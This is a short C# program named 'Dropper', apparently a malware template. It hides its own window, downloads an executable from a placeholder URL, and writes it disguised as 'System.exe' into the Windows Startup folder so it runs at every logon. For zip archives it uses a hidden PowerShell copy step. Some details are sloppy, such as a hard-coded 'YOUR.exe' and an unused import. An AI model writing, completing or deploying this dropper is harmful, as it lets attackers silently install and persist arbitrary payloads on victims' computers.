using System;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System.Threading.Tasks;

namespace Dropper
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        public static extern int GetConsoleWindow();

        static void Main()
        {
            IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
            ShowWindow(h, 0);
            {
                Console.WriteLine("Starting....");
                string main = "http://your.site.com/system.exe";
                string save_to = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System.exe";
                if (main.EndsWith(".zip"))
                {
                    Download(main, "C:\\Windows\\Temp\\" + main.Substring(main.LastIndexOf('/') + 1));
                    ZipFile.ExtractToDirectory("C:\\Windows\\Temp\\" + main.Substring(main.LastIndexOf('/') + 1), save_to);

                    System.Diagnostics.Process startup = new System.Diagnostics.Process();
                    startup.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startup.StartInfo.FileName = "powershell.exe";
                    startup.StartInfo.Arguments = "/C " + "copy C:\\Windows\\Temp\\YOUR.exe " + "'C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\System.exe'";
                    startup.Start();
                    Task.WaitAll();
                    startup.Close();
                }
                else
                {
                    Download(main, save_to);
                }
            }
        }

        static void Download(string url, string save_to)
        {
            var client = new WebClient();
            client.DownloadFile(url, save_to);
        }
    }
}
